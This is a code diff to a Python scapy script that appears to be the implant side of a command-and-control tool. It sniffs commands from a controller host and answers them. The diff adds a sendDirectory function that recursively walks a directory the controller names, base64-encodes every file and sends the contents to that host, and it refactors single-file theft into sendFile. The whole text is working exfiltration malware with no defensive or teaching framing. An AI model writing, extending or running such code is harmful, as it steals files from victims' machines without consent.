@@ -1,6 +1,7 @@
 from scapy.all import *
 import base64
 import time
+import os
 
 destination = "192.168.18.1"
 sniffInterface = "eth0"
@@ -36,6 +37,34 @@ def isAdmin():
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
     return is_admin
 
+def sendFile(fileName):
+    fileToSend = open(fileName,"rb")
+    binaryData = fileToSend.read()
+    encoded = (base64.b64encode(binaryData)).decode('ascii')
+
+    print("fileToSend: "+fileName)
+    print("Encoded file: "+encoded)
+    sendMessage(destination, fileName)
+    sendMessage(destination, encoded)
+
+def sendDirectory(path, isSubDirectory):
+    print("Sending path : "+ path)
+    for f in os.listdir(path):
+        filePath = path + '/' + f
+        print("filePath: "+filePath)
+        if os.path.isfile(filePath):
+            sendMessage(destination, "file")
+            sendFile(filePath)
+        else:
+            sendMessage(destination, "directory")
+            sendMessage(destination, filePath)
+
+            sendDirectory(filePath, True)
+        
+        time.sleep(0.5)
+    
+    if not isSubDirectory:
+    	sendMessage(destination, "end")
 
 if __name__ == "__main__":
 
@@ -55,13 +84,7 @@ if __name__ == "__main__":
             sendKeepAlive = False
 
             fileName = sniffMessage().decode("utf-8")
-            fileToSend = open(fileName,"rb")
-            binaryData = fileToSend.read()
-            encoded = (base64.b64encode(binaryData)).decode('ascii')
-
-            print("fileToSend: "+fileName)
-            print("Encoded file: "+encoded)
-            sendMessage(destination, encoded)
+            sendFile(fileName)
 
             sendKeepAlive = True
 
@@ -92,3 +115,12 @@ if __name__ == "__main__":
 
         elif action == "message":
             print(sniffMessage().decode("utf-8"))
+
+        elif action == "directory":
+            sendKeepAlive = False
+
+            directory = base64.b64decode(sniffMessage().decode("utf-8")).decode('utf-8')
+            print("directory :"+ directory)
+            sendDirectory(directory, False)
+
+            sendKeepAlive = True
